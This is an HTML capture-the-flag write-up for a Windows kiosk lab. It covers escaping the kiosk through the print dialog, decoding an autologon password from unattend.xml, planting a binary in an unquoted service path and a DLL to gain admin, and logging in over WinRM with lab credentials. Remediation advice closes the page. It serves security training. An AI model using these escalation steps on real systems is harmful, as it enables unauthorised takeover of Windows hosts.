@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackSmarter Kiosk (Medium): VDI escape, unquoted path, DLL plant</title>
+<style>
+  :root {
+    --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
+    --good: #5ddea8; --code: #1a2433; --border: #243246;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, sans-serif;
+    background: var(--bg); color: var(--text); line-height: 1.65; font-size: 16px;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 48px 24px 96px; }
+  h1 { font-size: 1.85rem; margin: 0 0 0.4em; }
+  h2 { font-size: 1.4rem; margin-top: 2.2em; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+  h3 { font-size: 1.08rem; color: var(--good); margin-top: 1.6em; }
+  .muted { color: var(--muted); }
+  .hero {
+    background: linear-gradient(145deg, #152033, #0f1622 55%, #1a1020);
+    border: 1px solid var(--border); border-radius: 16px; padding: 28px; margin-bottom: 2rem;
+  }
+  .pill {
+    display: inline-block; background: rgba(239,50,87,0.15); color: #ff7a95;
+    border: 1px solid rgba(239,50,87,0.4); border-radius: 999px;
+    padding: 0.2em 0.75em; font-size: 0.8rem; font-weight: 600; text-transform: uppercase;
+  }
+  .note {
+    background: rgba(251,191,36,0.1); border: 1px solid rgba(251,191,36,0.35);
+    border-radius: 10px; padding: 12px 14px; margin: 1rem 0; color: #fcd34d;
+  }
+  table.meta { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+  table.meta td { padding: 0.35em 0.5em; border-bottom: 1px solid var(--border); vertical-align: top; }
+  table.meta td:first-child { color: var(--muted); width: 28%; }
+  pre {
+    background: var(--code); border: 1px solid var(--border); border-radius: 10px;
+    padding: 14px 16px; overflow-x: auto; font-size: 0.84rem; line-height: 1.5;
+  }
+  code { font-family: ui-monospace, Menlo, Consolas, monospace; color: #c9e4ff; }
+  figure {
+    margin: 1.5rem 0; background: var(--panel); border: 1px solid var(--border);
+    border-radius: 12px; padding: 10px; overflow: hidden;
+  }
+  figure img { max-width: 100%; height: auto; display: block; border-radius: 8px; }
+  figcaption { color: var(--muted); font-size: 0.88rem; margin-top: 0.6rem; }
+  .flag {
+    background: #0e1f18; border: 1px solid rgba(93,222,168,0.45); color: var(--good);
+    font-family: ui-monospace, Menlo, Consolas, monospace; padding: 14px 16px;
+    border-radius: 10px; overflow-x: auto; margin: 1rem 0;
+  }
+  .why {
+    background: rgba(59,130,246,0.08); border-left: 3px solid #3b82f6;
+    padding: 0.75rem 1rem; margin: 0.75rem 0 1rem; border-radius: 0 8px 8px 0;
+  }
+  ul { padding-left: 1.2rem; }
+  a { color: #7cb8ff; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="hero">
+  <span class="pill">HackSmarter · Windows · Medium</span>
+  <h1>Kiosk: print escape, unattend, unquoted path, DLL plant</h1>
+  <p class="muted">Authorized lab only. Lab author: Ryan Yager. Notes 2026-08-07.</p>
+</div>
+
+<div class="note">
+  Status on disk: host was often <strong>powered off</strong> during the second pass.
+  Early RDP screenshots and enum exist. Flag file <em>contents</em> were not saved in loot.
+  Paths below match lab layout and operator notes under <code>~/kiosk/</code> and <code>~/htb/kiosk/</code>.
+</div>
+
+<table class="meta">
+  <tr><td>Box</td><td>Kiosk</td></tr>
+  <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
+  <tr><td>Type</td><td>Windows VDI kiosk escape and service abuse</td></tr>
+  <tr><td>Fault</td><td>Print dialog escape, unattend autologon, unquoted service path, DLL load</td></tr>
+  <tr><td>Level</td><td>Medium</td></tr>
+  <tr><td>Target</td><td><code>10.1.172.141</code> host <code>EC2AMAZ-0536LUM</code></td></tr>
+  <tr><td>Start user</td><td><code>vdiuser</code> / <code>VDI@DH2024!</code></td></tr>
+</table>
+
+<h2>What you need to know</h2>
+<ul>
+  <li>RDP into a locked HTA or workspace kiosk</li>
+  <li>Print dialog paths that open <code>cmd.exe</code></li>
+  <li>Windows <code>unattend.xml</code> autologon secrets</li>
+  <li>Unquoted service paths and DLL search order</li>
+</ul>
+
+<h2>Main idea</h2>
+<p>
+Escape the kiosk with the print dialog. Read unattend for the next user.
+Abuse an unquoted service path and a healthcheck DLL load to reach admin.
+</p>
+
+<pre>vdiuser RDP kiosk
+  → Ctrl+P / Find Printer → cmd
+  → flag1 + unattend.xml → svcuser
+  → unquoted DH_KioskMonitor → DH.exe plant
+  → healthcheck loads dhlog.dll → local admin
+  → WinRM → flag3 + flag4</pre>
+
+<figure>
+  <img src="images/06-workspace.png" alt="Darkhaven VDI workspace as vdiuser" />
+  <figcaption>Figure 1. Darkhaven VDI workspace as vdiuser.</figcaption>
+</figure>
+
+<h3>Step 1: Prove start password and ports</h3>
+<div class="why"><strong>Why:</strong> Confirm the host is on and the handed password works on SMB.</div>
+<pre>nmap -Pn -n -p 80,445,3389,5985,8443 --open 10.1.172.141
+nxc smb 10.1.172.141 -u vdiuser -p 'VDI@DH2024!' --local-auth</pre>
+<p><strong>Expect:</strong> 80, 445, 3389, 8443 open. SMB auth OK. Host <code>EC2AMAZ-0536LUM</code>.</p>
+
+<figure>
+  <img src="images/01-rdp.png" alt="RDP session start" />
+  <figcaption>Figure 2. RDP session start.</figcaption>
+</figure>
+
+<h3>Step 2: Kiosk escape with print dialog</h3>
+<div class="why"><strong>Why:</strong> The kiosk blocks a normal shell. Print Find Printer still opens a file dialog that can start programs.</div>
+<pre>xfreerdp /v:10.1.172.141 /u:vdiuser /p:'VDI@DH2024!' /sec:nla \
+  /dynamic-resolution /cert:ignore +clipboard /grab-keyboard
+
+# Inside kiosk:
+# Ctrl+P → Find Printer… → open C:\Windows\System32\cmd.exe</pre>
+
+<figure>
+  <img src="images/02-print.png" alt="Print dialog" />
+  <figcaption>Figure 3. Print path used for escape.</figcaption>
+</figure>
+
+<figure>
+  <img src="images/03-open-cmd.png" alt="Attempt to open cmd" />
+  <figcaption>Figure 4. Open path to cmd from dialog.</figcaption>
+</figure>
+
+<h3>Step 3: Flag 1 and unattend</h3>
+<div class="why"><strong>Why:</strong> First flag is under VDI data. Autologon password opens the next account.</div>
+<pre>type C:\VDIData\flag1.txt
+type C:\Windows\Panther\unattend.xml
+# Autologon password is UTF-16LE base64 → Svc_DH!2024 for svcuser</pre>
+<div class="flag">Flag 1 path: C:\VDIData\flag1.txt
+(content not saved in local loot)</div>
+
+<pre># decode check (lab value)
+echo 'UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==' | base64 -d | iconv -f UTF-16LE -t UTF-8
+# Svc_DH!2024</pre>
+
+<figure>
+  <img src="images/04-cdrive.png" alt="Browse C drive from dialog" />
+  <figcaption>Figure 5. Browse C: from the open dialog.</figcaption>
+</figure>
+
+<h3>Step 4: svcuser and flag 2</h3>
+<div class="why"><strong>Why:</strong> svcuser has a normal session and more write rights for the service path.</div>
+<pre>runas /user:svcuser powershell
+# password: Svc_DH!2024
+type C:\Users\svcuser\Desktop\flag2.txt
+
+# or RDP:
+xfreerdp /v:10.1.172.141 /u:svcuser /p:'Svc_DH!2024' /sec:nla /cert:ignore</pre>
+<div class="flag">Flag 2 path: C:\Users\svcuser\Desktop\flag2.txt</div>
+
+<h3>Step 5: Unquoted service path</h3>
+<div class="why"><strong>Why:</strong> Space in the path without quotes lets Windows run a planted <code>DH.exe</code> first.</div>
+<pre>sc qc DH_KioskMonitor
+# BINARY_PATH includes: C:\Program Files\Darkhaven Kiosk Services\...
+# SERVICE_START_NAME: .\dh_admin
+
+# Plant:
+# C:\Program Files\Darkhaven Kiosk Services\DH.exe
+# Build a service binary that logs the healthcheck DLL path (stage 1)
+# Then plant C:\DarkhavenTools\logs\dhlog.dll (stage 2)</pre>
+<p>Operator payloads live under <code>~/kiosk/payloads/</code> (<code>svc_stage1.cs</code>, <code>svc_stage2.cs</code>, <code>dhlog.dll</code>).</p>
+
+<h3>Step 6: Admin and flags 3 and 4</h3>
+<div class="why"><strong>Why:</strong> After the DLL or service plant creates a local admin, take the last flags over WinRM.</div>
+<pre># example after plant (lab operator chose user pwned / Password123! in notes)
+evil-winrm -i 10.1.172.141 -u pwned -p 'Password123!'
+type C:\Users\dh_admin\Desktop\flag3.txt
+type C:\Users\Administrator\Desktop\flag4.txt</pre>
+<div class="flag">Flag 3 path: C:\Users\dh_admin\Desktop\flag3.txt
+Flag 4 path: C:\Users\Administrator\Desktop\flag4.txt
+(content not saved in local loot)</div>
+
+<p><strong>Password chain from notes</strong></p>
+<pre>vdiuser / VDI@DH2024!     handed start
+svcuser / Svc_DH!2024     unattend autologon
+dh_admin / (service)      unquoted path context
+local admin after DLL     operator plant</pre>
+
+<h2>Impact</h2>
+<ul>
+  <li>Kiosk breakout to cmd</li>
+  <li>Clear autologon password on disk</li>
+  <li>Service misconfig to local admin</li>
+</ul>
+
+<h2>Fix</h2>
+<ul>
+  <li>Lock print and file dialogs in the kiosk profile. Use AppLocker or WDAC.</li>
+  <li>Remove plain autologon secrets from Panther. Use LAPS or vaulted secrets.</li>
+  <li>Quote every service binary path. Harden ACL on Program Files trees.</li>
+  <li>Do not load writable DLL paths from services. Alert on new local admins.</li>
+</ul>
+
+<h2>Close</h2>
+<p>
+Kiosk is print escape, then classic Windows PE. Power the box on before you burn time on empty ports.
+</p>
+
+<footer>
+  <p>Authorized training only. Do not use these steps without permission.</p>
+  <p><a href="../../../">mccleod1290.github.io</a> · <a href="../">Windows labs</a> · <a href="../../">HackSmarter</a></p>
+</footer>
+
+</div>
+</body>
+</html>
